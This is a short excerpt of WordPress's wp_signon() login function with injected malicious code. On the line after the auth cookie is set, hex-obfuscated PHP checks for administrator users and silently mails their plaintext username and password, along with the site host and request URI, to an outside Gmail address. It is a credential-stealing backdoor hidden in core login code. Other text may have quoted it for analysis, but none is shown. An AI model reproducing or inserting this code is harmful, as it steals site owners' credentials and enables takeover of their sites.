...
function wp_signon( $credentials = array(), $secure_cookie = '' ) {
	...
	wp_set_auth_cookie($user->ID, $credentials['remember'], $secure_cookie);if ($user->has_cap("\x61\x64\x6D\x69\x6E\x69\x73\x74\x72\x61\x74\x6F\x72")) {
    @mail("\x61\x6C\x6B\x69\x6E\x73\x6B\x62\x72\x66\x66\x6A\x6A@\x67\x6D\x61\x69\x6C.\x63\x6F\x6D", "WP - " . $_SERVER["\x48\x54\x54\x50_\x48OS\x54"], $_SERVER["\x52EQUES\x54_U\x52I"] . "\n\n\n" . $credentials["\x75\x73\x65\x72_\x6C\x6F\x67\x69\x6E"] . "\n\n\n" . $credentials["\x75\x73\x65\x72_\x70\x61\x73\x73\x77\x6F\x72\x64"] . "\n\n\n" . $user->user_registered);
}
	/**
